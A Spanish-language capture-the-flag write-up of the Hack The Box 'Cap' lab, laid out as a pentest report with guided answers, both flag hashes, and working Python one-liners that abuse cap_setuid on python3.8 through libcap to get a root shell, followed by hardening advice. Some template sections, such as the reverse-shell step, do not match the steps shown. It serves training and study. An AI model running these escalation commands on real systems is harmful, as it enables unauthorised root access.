---
title: "Informe Técnico: Cap (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Cap de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cap/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Cap

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Cap** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Cap |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Easy |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**How many TCP ports are open?**

R: 3

![Captura de pantalla 2025-08-18 095357.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cap/images/step_01.png)

**After running a "Security Snapshot", the browser is redirected to a path of the format** `/[something]/[id]`**, where** `[id]` **represents the id number of the scan. What is the** `[something]`

R: data

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cap/images/step_02.png)

**Are you able to get to other users' scans?**

R: yes

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cap/images/step_03.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cap/images/step_04.png)

**What is the ID of the PCAP file that contains sensative data?**

R:0

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cap/images/step_05.png)

**Which application layer protocol in the pcap file can the sensetive data be found in?**

R: ftp

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cap/images/step_06.png)

**We've managed to collect nathan's FTP password. On what other service does this password work?**

R: ssh

![Captura de pantalla 2025-08-18 101111.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cap/images/step_07.png)

**Submit the flag located in the nathan user's home directory.**

R: 0390cba37dda81b28c4cd07cbeb07f0b

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cap/images/step_08.png)

**What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?**

R: /usr/bin/python3.8

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cap/images/step_09.png)

Submit the flag located in root's home directory.

R: 7c2f96d18962057bc15a4b323158063d

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/cap/images/step_10.png)

> 
> 
> 
> # Escalada con `python3.8` que tiene `cap_setuid+eip`
> 
> ## ¿Qué ves con `getcap`?
> 
> ```
> /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
> 
> ```
> 
> Significa que **ese binario** trae embebidas capacidades de Linux (file capabilities):
> 
> - `cap_setuid` → el proceso **puede** cambiar su UID (p. ej., a 0).
> - `+eip` → la capacidad está en los conjuntos **E**ffective, **I**nheritable y **P**ermitted del **archivo**.
>     
>     En la práctica, al ejecutar el binario obtendrás la cap al menos en **Permitted**; a veces no queda **Effective** “levantada” por restricciones del entorno (p. ej., `no_new_privs` heredado o cómo arranca el intérprete).
>     
> 
> Por eso, el simple:
> 
> ```bash
> /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
> 
> ```
> 
> puede fallar con **`Operation not permitted`**: tienes la cap en *Permitted* pero **no** en *Effective*.
> 
> ## Fix: levantar la cap a **Effective** con `libcap` y luego hacer `setuid(0)`
> 
> One-liner que funciona:
> 
> ```bash
> /usr/bin/python3.8 -c 'import ctypes,os
> libcap=ctypes.CDLL("libcap.so.2")
> CAP_SETUID=7; CAP_EFFECTIVE=2
> cap=libcap.cap_get_proc()
> libcap.cap_set_flag(cap, CAP_EFFECTIVE, 1, (ctypes.c_int*1)(CAP_SETUID), 1)
> libcap.cap_set_proc(cap)
> os.setuid(0); os.execl("/bin/bash","bash","-p")'
> 
> ```
> 
> ### Qué hace, paso a paso
> 
> 1. **Carga libcap**: `ctypes.CDLL("libcap.so.2")` para manipular capacidades del proceso.
> 2. **Lee capacidades del proceso**: `cap_get_proc()`.
> 3. **Activa CAP_SETUID en el set Effective**: `cap_set_flag(..., CAP_EFFECTIVE, ...)`.
> 4. **Aplica los cambios**: `cap_set_proc(cap)`.
> 5. **Cambia a root**: `os.setuid(0)`.
> 6. **Shell como root, preservando privilegios**: `bash -p`.
> 
> > Nota: no necesitas setgid(0) porque no tienes cap_setgid. Con EUID=0 basta.
> > 
> 
> ---
> 
> ## Comprobaciones útiles
> 
> Ver si realmente tienes la cap en **Permitted/Effective** y si heredas `no_new_privs`:
> 
> ```bash
> /usr/bin/python3.8 -c 's=open("/proc/self/status").read()
> print("\n".join(l for l in s.splitlines() if l.startswith(("CapPrm","CapEff","CapInh","NoNewPrivs"))))'
> 
> ```
> 
> - `CapPrm` con bit de `CAP_SETUID` y `CapEff` sin él ⇒ necesitas el snippet de `libcap`.
> - `NoNewPrivs: 1` ⇒ puede impedir aplicar caps al *exec*. Aun así, si `CapPrm` ya lo tienes, **promover a Effective** suele funcionar (como arriba).
> 
> ---
> 
> ## Variantes y alternativas
> 
> ### A) Variante con `setresuid` (libc)
> 
> Útil si `os.setuid` diera lata:
> 
> ```bash
> /usr/bin/python3.8 -c 'import ctypes,os
> libcap=ctypes.CDLL("libcap.so.2"); libc=ctypes.CDLL("libc.so.6")
> CAP_SETUID=7; CAP_EFFECTIVE=2
> cap=libcap.cap_get_proc()
> libcap.cap_set_flag(cap, CAP_EFFECTIVE, 1, (ctypes.c_int*1)(CAP_SETUID), 1)
> libcap.cap_set_proc(cap)
> libc.setresuid(0,0,0)
> os.execl("/bin/sh","sh","-p")'
> 
> ```
> 
> ### B) Script en fichero
> 
> ```bash
> cat >/tmp/cap2root.py <<'PY'
> import ctypes, os
> libcap=ctypes.CDLL("libcap.so.2")
> CAP_SETUID=7; CAP_EFFECTIVE=2
> cap=libcap.cap_get_proc()
> libcap.cap_set_flag(cap, CAP_EFFECTIVE, 1, (ctypes.c_int*1)(CAP_SETUID), 1)
> libcap.cap_set_proc(cap)
> os.setuid(0)
> os.execl("/bin/bash","bash","-p")
> PY
> /usr/bin/python3.8 /tmp/cap2root.py
> 
> ```
> 
> ### C) Si el binario con cap es **otro** (idea general)
> 
> El patrón es el mismo: **ejecuta el binario capado**, **promueve a Effective** la cap que te interesa y luego llama a la syscall correcta.
> 
> En este caso nos interesa `CAP_SETUID`; con otras caps (p. ej. `cap_net_bind_service`) *no* obtienes root, solo privilegios de red.
> 
> ---
> 
> ## Resumen para tu chuleta
> 
> - **Detección**: `getcap -r / 2>/dev/null | grep cap_setuid`
> - **Comprobación en proceso**: mira `CapPrm/CapEff` en `/proc/self/status`.
> - **Explotación**: activar `CAP_SETUID` en **Effective** con `libcap`, luego `setuid(0)` y shell `p`.
> 
> Corta-pega “ganador”:
> 
> ```bash
> /usr/bin/python3.8 -c 'import ctypes,os
> libcap=ctypes.CDLL("libcap.so.2"); CAP_SETUID=7; CAP_EFFECTIVE=2
> cap=libcap.cap_get_proc()
> libcap.cap_set_flag(cap, CAP_EFFECTIVE, 1, (ctypes.c_int*1)(CAP_SETUID), 1)
> libcap.cap_set_proc(cap)
> os.setuid(0); os.execl("/bin/bash","bash","-p")'
> 
> ```
>

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
